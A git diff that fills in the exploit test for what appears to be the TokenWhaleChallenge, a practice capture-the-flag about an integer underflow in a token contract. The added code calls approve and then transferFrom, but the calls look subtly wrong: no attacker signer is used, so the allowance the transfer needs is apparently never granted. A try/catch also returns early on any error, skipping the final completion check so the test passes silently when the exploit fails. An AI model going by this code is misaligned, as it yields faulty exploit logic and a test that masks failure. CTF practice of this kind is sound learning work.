@@ -21,10 +21,26 @@ describe('TokenWhaleChallenge', () => {
   });
 
   it('exploit', async () => {
-    /**
-     * YOUR CODE HERE
-     * */
+    try {
+      // Step 1: Approve a large number of tokens for the attacker address
+      const largeAllowance = ethers.constants.MaxUint256;
+      console.log(`Approving allowance of: ${largeAllowance.toString()}`);
+      await target.approve(attacker.address, largeAllowance);
 
+      console.log('Approval successful');
+
+      // Step 2: Transfer more tokens than the player has, causing an underflow
+      const largeTransfer = ethers.BigNumber.from('1001');
+      console.log(`Attempting to transfer: ${largeTransfer.toString()} tokens`);
+      await target.transferFrom(attacker.address, attacker.address, largeTransfer);
+
+      console.log('Transfer successful');
+    } catch (error) {
+      console.error('An error occurred:', error);
+      return; // Exit the test if any step fails
+    }
+
+    // Check if the challenge is complete
     expect(await target.isComplete()).to.equal(true);
   });
 });
